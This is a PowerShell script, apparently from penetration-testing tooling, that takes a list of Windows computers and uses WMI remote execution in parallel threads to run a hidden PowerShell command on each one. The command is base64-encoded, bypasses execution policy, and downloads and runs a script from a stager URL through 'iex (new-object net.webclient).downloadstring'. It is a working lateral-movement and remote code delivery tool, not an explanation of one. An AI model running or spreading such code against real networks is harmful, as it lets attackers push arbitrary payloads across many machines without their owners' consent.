#Multi Threading :D
#Install-Module -Name PoshRSJob -Force
#maybe need manually import of wmiexec
. .\WmiExec.ps1
function Invoke-WindowsWMI{
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",
        
        [Parameter(Mandatory=$true)]
        $StagerUrl
    )
    #Import ComputerNames
    if($Computers.GetType().name -like 'String'){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
        . $PSScriptRoot\WmiExec.ps1
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (new-object net.webclient).downloadstring('$stagerurl')"))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'StagerUrl' = $Enc
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad Invoke-WMIExec -ScriptBlock {
            param($Inputargs)
            $Location = $Inputargs.Location
            $StagerUrl = $Inputargs.StagerUrl
            Start-Transcript -Path "$Location\$($_)"
            Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $StagerUrl"
            Stop-Transcript
    } | Wait-RSJob -ShowProgress
    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Host "[-] Failed connecting to following hosts" -ForegroundColor Red
        Write-Output $errors
    }
}
#Invoke-WindowsWMI -stagerurl 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/chaps.ps1'